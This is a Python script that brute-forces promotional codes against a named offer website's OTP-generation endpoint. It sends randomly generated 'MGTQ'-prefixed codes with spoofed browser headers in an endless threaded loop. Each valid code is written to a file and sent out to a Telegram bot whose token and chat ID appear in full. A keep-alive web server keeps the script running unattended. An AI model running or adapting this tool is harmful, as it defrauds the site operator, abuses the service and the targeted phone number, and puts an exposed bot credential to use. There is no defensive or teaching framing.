import os
import time
import random
import string
import json
import threading
import requests
import concurrent.futures
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9038529139"

NUM_CODES = 100000
MAX_WORKERS = 5
DELAY_PER_THREAD = 2.0
STATUS_INTERVAL = 100      # send status every 100 codes

TELEGRAM_TOKEN = "8789555036:AAGw-EovbhVHoI81lD6QJ9AeFhn4eJNnFaY"
TELEGRAM_CHAT_ID = "5177144784"

# ================== GLOBALS ==================
print_lock = threading.Lock()
code_counter = 0
valid_counter = 0
error_counts = defaultdict(int)   # error_type -> count
last_error_sent = 0               # throttle errors

# ================== TELEGRAM ==================
def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except Exception as e:
        print(f"Telegram send failed: {e}")

def report_error(error_type, details):
    global last_error_sent
    now = time.time()
    # Throttle: at most one error per 30 seconds per type
    if now - last_error_sent < 30:
        return
    last_error_sent = now
    error_counts[error_type] += 1
    msg = f"⚠️ ERROR [{error_type}]: {details}\nTotal {error_type} errors: {error_counts[error_type]}"
    send_telegram_message(msg)

# ================== CODE GENERATION ==================
def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(chars, k=6))

# ================== CODE CHECKER (original detailed version) ==================
def check_code(code: str, mobile: str = TEST_MOBILE):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": mobile, "ccode": code}
    start_time = time.time()

    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)

        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "valid": False,
            "message": "",
        }

        if response.status_code == 200:
            try:
                json_resp = response.json()
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent"
                elif json_resp.get("status") == "failure":
                    msg = json_resp.get("msg1") or json_resp.get("msg") or "failure"
                    result["message"] = f"❌ {msg}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = "❌ Invalid code"
                else:
                    result["message"] = f"❌ Unknown status: {json_resp.get('status')}"
                    report_error("UnknownStatus", f"status={json_resp.get('status')} for {code}")
            except Exception as e:
                result["message"] = "❌ JSON parse error"
                report_error("JSONParse", f"{str(e)[:100]}")
        else:
            result["message"] = f"❌ HTTP {response.status_code}"
            report_error("HTTPError", f"status {response.status_code} for {code}")

        return result

    except requests.exceptions.Timeout:
        report_error("Timeout", f"request timed out for {code}")
        return {"code": code, "valid": False, "message": "❌ Timeout"}
    except requests.exceptions.ConnectionError:
        report_error("ConnectionError", f"cannot connect to {BASE_URL}")
        return {"code": code, "valid": False, "message": "❌ Connection error"}
    except Exception as e:
        report_error("Generic", f"{type(e).__name__}: {str(e)[:100]}")
        return {"code": code, "valid": False, "message": f"❌ {str(e)}"}

# ================== PROCESS ONE CODE ==================
def process_code(code):
    global code_counter, valid_counter
    result = check_code(code)

    with print_lock:
        code_counter += 1
        if result["valid"]:
            valid_counter += 1
            # send valid code to Telegram immediately
            msg = f"🎉 VALID CODE FOUND!\n🔑 {code}\n📱 {TEST_MOBILE}\n⏰ {time.ctime()}"
            send_telegram_message(msg)
            # save to file
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")
            print(f"✅ {code} - {result['message']}")
        else:
            print(f"❌ {code} - {result['message']}")

        # send status update every STATUS_INTERVAL codes
        if code_counter % STATUS_INTERVAL == 0:
            status_msg = f"📊 Status: {code_counter} codes checked, {valid_counter} valid found."
            send_telegram_message(status_msg)

    time.sleep(DELAY_PER_THREAD)

# ================== VALIDATOR LOOP ==================
def run_validator():
    send_telegram_message("🚀 Validator started (full version with error reporting)")
    send_telegram_message(f"🎯 Target mobile: {TEST_MOBILE}")
    print("Validator running...")
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(process_code, codes)
        print(f"Batch done. Sleeping 5 sec...")
        time.sleep(5)

# ================== SIMPLE HTTP KEEP-ALIVE ==================
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Validator running - OK")
    def log_message(self, format, *args):
        pass

def start_http_server():
    port = int(os.environ.get("PORT", 5000))
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"HTTP keep-alive server running on port {port}")
    server.serve_forever()

# ================== MAIN ==================
if __name__ == "__main__":
    threading.Thread(target=run_validator, daemon=True).start()
    start_http_server()
